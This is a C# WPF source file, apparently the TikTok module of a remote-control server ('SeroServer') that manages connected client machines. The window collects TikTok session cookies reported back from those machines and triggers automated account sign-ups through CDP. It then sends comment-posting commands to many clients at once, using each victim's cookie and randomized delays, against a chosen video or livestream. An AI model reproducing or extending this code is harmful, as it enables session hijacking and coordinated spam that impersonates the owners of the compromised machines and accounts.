using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Input;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

// ── ViewModels ────────────────────────────────────────────────────────────────

public class TikTokClientVM : INotifyPropertyChanged
{
    public string Id    { get; set; } = "";
    public string Label { get; set; } = "";

    private bool   _selected = false;
    private string _status   = "—";
    private string _cookie   = "";

    public bool Selected
    {
        get => _selected;
        set { _selected = value; OnProp(); }
    }

    public string Status
    {
        get => _status;
        set { _status = value; OnProp(); }
    }

    public string Cookie
    {
        get => _cookie;
        set { _cookie = value; OnProp(); OnProp(nameof(CookieShort)); OnProp(nameof(HasCookie)); }
    }

    public bool   HasCookie   => !string.IsNullOrEmpty(_cookie);
    public string CookieShort => _cookie.Length > 44 ? _cookie[..44] + "…" : _cookie;

    public event PropertyChangedEventHandler? PropertyChanged;
    private void OnProp([CallerMemberName] string? n = null)
        => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(n));
}

// ── Window ────────────────────────────────────────────────────────────────────

public partial class TikTokWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly ObservableCollection<TikTokClientVM> _clients = [];
    private bool _running;
    private int  _sentCount;
    private int  _signingCount;
    private CancellationTokenSource? _cts;
    private const string StatusSigningUp = "Signing up…";

    public TikTokWindow(TlsServer server, IEnumerable<string>? selectedIds = null)
    {
        InitializeComponent();
        _server = server;

        ClientList.ItemsSource  = _clients;
        GridAccounts.ItemsSource = _clients;

        // Populate from currently connected clients — pre-select only those chosen in ServerWindow
        var preSelected = selectedIds?.ToHashSet(StringComparer.OrdinalIgnoreCase) ?? [];
        foreach (var c in _server.ConnectedClients.Values)
        {
            AddClient(c);
            if (preSelected.Count > 0 && _clients.Count > 0)
                _clients[^1].Selected = preSelected.Contains(c.Id);
        }

        Loaded += (_, _) => UpdateSelCount();

        // Track connects/disconnects
        _server.ClientConnected    += OnClientConnected;
        _server.ClientDisconnected += OnClientDisconnected;

        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _cts?.Cancel();
            _server.ClientConnected    -= OnClientConnected;
            _server.ClientDisconnected -= OnClientDisconnected;
            // Unregister all handlers
            foreach (var vm in _clients)
                UnregisterHandlers(vm.Id);
            Lang.LanguageChanged -= ApplyLanguage;
        };
    }

    private void ApplyLanguage() { this.Title = Lang.Get("FEAT_TIKTOK_BOT"); }

    // ── Client tracking ──────────────────────────────────────────────────────

    private void AddClient(ConnectedClient c)
    {
        var label = string.IsNullOrEmpty(c.Tag) ? $"{c.Username}@{c.IP}" : c.Tag;
        var vm = new TikTokClientVM { Id = c.Id, Label = label };
        _clients.Add(vm);
        RegisterHandlers(vm.Id);
        UpdateAccountCount();
        UpdateSelCount();
    }

    private void OnClientConnected(ConnectedClient c)
        => Dispatcher.BeginInvoke(() => AddClient(c));

    private void OnClientDisconnected(ConnectedClient c)
        => _ = Dispatcher.BeginInvoke(() =>
        {
            var vm = _clients.FirstOrDefault(x => x.Id == c.Id);
            if (vm == null) return;
            if (vm.Status == StatusSigningUp && _signingCount > 0)
            {
                _signingCount--;
                if (_signingCount <= 0) { BtnCdpSignup.IsEnabled = true; BtnCdpSignup.Content = "🤖 Signup Selected"; }
            }
            UnregisterHandlers(vm.Id);
            _clients.Remove(vm);
            UpdateAccountCount();
            UpdateSelCount();
        });

    private void RegisterHandlers(string id)
    {
        _server.RegisterHandler(id, PacketType.TikTokCommentAck,   p => OnCommentAck(id, p));
        _server.RegisterHandler(id, PacketType.TikTokCookieResult, p => OnCookieResult(id, p));
        _server.RegisterHandler(id, PacketType.CdpSignupStatus,    p => OnCdpStatus(id, p));
        _server.RegisterHandler(id, PacketType.CdpSignupResult,    p => OnCdpResult(id, p));
    }

    private void UnregisterHandlers(string id)
    {
        _server.UnregisterHandler(id, PacketType.TikTokCommentAck);
        _server.UnregisterHandler(id, PacketType.TikTokCookieResult);
        _server.UnregisterHandler(id, PacketType.CdpSignupStatus);
        _server.UnregisterHandler(id, PacketType.CdpSignupResult);
    }

    private void UpdateAccountCount()
    {
        var n = _clients.Count(x => x.HasCookie);
        TxtAccountCount.Text = $"{n} account{(n != 1 ? "s" : "")} / {_clients.Count} client{(_clients.Count != 1 ? "s" : "")}";
    }

    // ── Incoming packets ─────────────────────────────────────────────────────

    private void OnCommentAck(string id, Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<TikTokCommentAckData>(pkt.Data);
        if (d == null) return;
        _ = Dispatcher.BeginInvoke(() =>
        {
            var vm = _clients.FirstOrDefault(x => x.Id == id);
            if (d.Success)
            {
                _sentCount++;
                TxtSentCount.Text = $"  {_sentCount} sent";
                AddLog($"[✓] {vm?.Label ?? (id.Length >= 8 ? id[..8] : id)} → posted");
                TxtProgress.Text = $"{_sentCount} sent";
            }
            else
            {
                AddLog($"[✗] {vm?.Label ?? (id.Length >= 8 ? id[..8] : id)} → {d.Error}");
            }
        });
    }

    private void OnCookieResult(string id, Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<TikTokCookieResultData>(pkt.Data);
        if (d == null) return;
        _ = Dispatcher.BeginInvoke(() =>
        {
            var vm = _clients.FirstOrDefault(x => x.Id == id);
            if (vm == null) return;
            if (d.Found)
            {
                vm.Cookie = d.Cookie;
                vm.Status = "✓ session detected";
                AddLog($"[✓] {vm.Label} — session cookie loaded");
                UpdateAccountCount();
            }
            else
            {
                vm.Status = "✗ no session";
                AddLog($"[✗] {vm.Label} — no TikTok session found");
            }
        });
    }

    private void OnCdpStatus(string id, Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<CdpSignupStatusData>(pkt.Data);
        if (d == null) return;
        _ = Dispatcher.BeginInvoke(() =>
        {
            var vm = _clients.FirstOrDefault(x => x.Id == id);
            if (vm != null) vm.Status = d.Message;
            TxtCdpLog.AppendText($"[{vm?.Label ?? (id.Length >= 8 ? id[..8] : id)}] {d.Message}\n");
            TxtCdpLog.ScrollToEnd();
        });
    }

    private void OnCdpResult(string id, Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<CdpSignupResultData>(pkt.Data);
        if (d == null) return;
        _ = Dispatcher.BeginInvoke(() =>
        {
            var vm = _clients.FirstOrDefault(x => x.Id == id);
            if (vm == null) return;
            if (d.Success)
            {
                vm.Cookie = d.Cookie;
                vm.Status = string.IsNullOrEmpty(d.Account) ? "✓ account created" : $"✓ {d.Account}";
                AddLog($"[✓] {vm.Label} — account created" +
                       (string.IsNullOrEmpty(d.Account) ? "" : $" ({d.Account})"));
                TxtCdpLog.AppendText($"[✓] {vm.Label} — done\n");
                UpdateAccountCount();
            }
            else
            {
                vm.Status = $"✗ {d.Error}";
                TxtCdpLog.AppendText($"[✗] {vm.Label} — {d.Error}\n");
                AddLog($"[✗] {vm.Label} — signup failed: {d.Error}");
            }
            TxtCdpLog.ScrollToEnd();
            if (--_signingCount <= 0)
            {
                _signingCount = 0;
                BtnCdpSignup.IsEnabled = true;
                BtnCdpSignup.Content   = "🤖 Signup Selected";
            }
        });
    }

    // ── CDP Auto-Signup ───────────────────────────────────────────────────────

    private async void BtnCdpSignup_Click(object s, RoutedEventArgs e)
    {
        try
        {
            var selected = _clients.Where(c => c.Selected).ToList();
            if (selected.Count == 0) { TxtStatus.Text = Lang.Get("TT_NO_CLIENTS"); return; }

            BtnCdpSignup.IsEnabled = false;
            BtnCdpSignup.Content   = $"⏳ Running ({selected.Count})…";
            TxtCdpLog.Text         = "";
            TxtStatus.Text         = $"CDP signup running on {selected.Count} client(s)…";
            _signingCount = selected.Count;

            foreach (var vm in selected)
            {
                vm.Status = StatusSigningUp;
                await _server.SendToClient(vm.Id, new Packet { Type = PacketType.CdpSignupStart });
            }
        }
        catch (Exception ex) { TxtStatus.Text = $"Error: {ex.Message}"; BtnCdpSignup.IsEnabled = true; }
    }

    // ── Comment broadcast ─────────────────────────────────────────────────────

    private async void BtnStart_Click(object s, RoutedEventArgs e)
    {
        try
        {
            var accounts = _clients.Where(c => c.HasCookie && c.Selected).ToList();
            if (accounts.Count == 0) { TxtStatus.Text = Lang.Get("TT_NO_COOKIES"); return; }
            var comments = GetComments();
            if (comments.Length == 0) { TxtStatus.Text = Lang.Get("TT_NO_COMMENT"); return; }
            if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = Lang.Get("TT_NO_VIDEO"); return; }
            if (!int.TryParse(TxtDelayMin.Text, out int dMin) || !int.TryParse(TxtDelayMax.Text, out int dMax))
            { TxtStatus.Text = Lang.Get("TT_INVALID_DELAY"); return; }
            if (dMin > dMax) dMax = dMin;

            SetRunning(true);
            var prevCts = _cts;
            prevCts?.Cancel();
            prevCts?.Dispose();
            _cts = new CancellationTokenSource();
            var ct      = _cts.Token;
            var isLive  = RbLive.IsChecked == true;
            var videoId = TxtVideoId.Text.Trim();

            AddLog($"[▶] {accounts.Count} accounts · {comments.Length} comment(s) · delay {dMin}-{dMax}s");

            await Task.Run(async () =>
            {
                for (int i = 0; i < accounts.Count && !ct.IsCancellationRequested; i++)
                {
                    var vm      = accounts[i];
                    var comment = comments[i % comments.Length];
                    int idx = i;
                    _ = Dispatcher.BeginInvoke(() =>
                    {
                        TxtBadge.Text    = $"{Lang.Get("TT_BADGE_POSTING")} ({idx + 1}/{accounts.Count})";
                        TxtProgress.Text = "Pass 1";
                        TxtStatus.Text   = $"Posting to {vm.Label}…";
                    });

                    await _server.SendToClient(vm.Id, new Packet
                    {
                        Type = PacketType.TikTokComment,
                        Data = JsonConvert.SerializeObject(new TikTokCommentData
                        {
                            VideoId    = videoId,
                            Text       = comment,
                            Cookie     = vm.Cookie,
                            IsLiveroom = isLive
                        })
                    });

                    int delay = Random.Shared.Next(dMin, dMax + 1) * 1000;
                    try { await Task.Delay(delay, ct); } catch (OperationCanceledException) { break; }
                }
                _ = Dispatcher.BeginInvoke(() => SetRunning(false));
            }, ct);
        }
        catch (Exception ex) { TxtStatus.Text = $"Error: {ex.Message}"; SetRunning(false); }
    }

    private void BtnStop_Click(object s, RoutedEventArgs e)
    {
        _cts?.Cancel();
        SetRunning(false);
        AddLog("[■] Stopped");
    }

    private async void BtnPostOnce_Click(object s, RoutedEventArgs e)
    {
        try
        {
            var accounts = _clients.Where(c => c.HasCookie && c.Selected).ToList();
            if (accounts.Count == 0) { TxtStatus.Text = Lang.Get("TT_NO_ACCOUNTS"); return; }
            var comments = GetComments();
            if (comments.Length == 0) { TxtStatus.Text = Lang.Get("TT_NO_COMMENT"); return; }
            if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = Lang.Get("TT_NO_VIDEO"); return; }

            var isLive  = RbLive.IsChecked == true;
            var videoId = TxtVideoId.Text.Trim();
            AddLog($"[→] Single post — {accounts.Count} account(s)");

            for (int i = 0; i < accounts.Count; i++)
            {
                var vm      = accounts[i];
                var comment = comments[i % comments.Length];
                await _server.SendToClient(vm.Id, new Packet
                {
                    Type = PacketType.TikTokComment,
                    Data = JsonConvert.SerializeObject(new TikTokCommentData
                    {
                        VideoId = videoId, Text = comment, Cookie = vm.Cookie, IsLiveroom = isLive
                    })
                });
            }
        }
        catch (Exception ex) { TxtStatus.Text = $"Error: {ex.Message}"; }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void Client_SelectChanged(object s, RoutedEventArgs e) => UpdateSelCount();

    private void BtnSelectAll_Click(object s, RoutedEventArgs e)
    {
        foreach (var c in _clients) c.Selected = true;
        UpdateSelCount();
    }

    private void BtnSelectNone_Click(object s, RoutedEventArgs e)
    {
        foreach (var c in _clients) c.Selected = false;
        UpdateSelCount();
    }

    private void UpdateSelCount()
    {
        int sel   = _clients.Count(c => c.Selected);
        int total = _clients.Count;
        if (TxtSelCount != null)
            TxtSelCount.Text = $"{sel} / {total} selected";
    }

    private void RbTarget_Changed(object s, RoutedEventArgs e)
    {
        if (TxtVideoId == null) return;
        bool isLive = RbLive?.IsChecked == true;
        TxtVideoId.ToolTip = isLive
            ? "TikTok livestream URL or room ID"
            : "TikTok video URL or numeric video ID";
    }

    private string[] GetComments()
        => TxtComments.Text
            .Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(l => l.Trim()).Where(l => l.Length > 0).ToArray();

    private void TxtComments_Changed(object s, System.Windows.Controls.TextChangedEventArgs e)
    {
        var n = GetComments().Length;
        TxtQueueCount.Text = $"{n} comment{(n != 1 ? "s" : "")}";
    }

    private void BtnClearAccounts_Click(object s, RoutedEventArgs e)
    {
        foreach (var vm in _clients) { vm.Cookie = ""; vm.Status = "—"; }
        UpdateAccountCount();
        AddLog("[·] Accounts cleared");
    }

    private void BtnClearLog_Click(object s, RoutedEventArgs e)
    {
        TxtLog.Clear();
        _sentCount = 0;
        TxtSentCount.Text = "";
        TxtProgress.Text  = "";
    }

    private void SetRunning(bool running)
    {
        _running = running;
        BtnStart.IsEnabled  = !running; BtnStart.Opacity  = running ? 0.4 : 1.0;
        BtnStop.IsEnabled   =  running; BtnStop.Opacity   = running ? 1.0 : 0.4;
        BadgeRunning.Visibility = running ? Visibility.Visible : Visibility.Collapsed;
        if (!running) TxtBadge.Text = Lang.Get("TT_BADGE_POSTING");
    }

    private void AddLog(string msg)
    {
        TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
        TxtLog.ScrollToEnd();
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
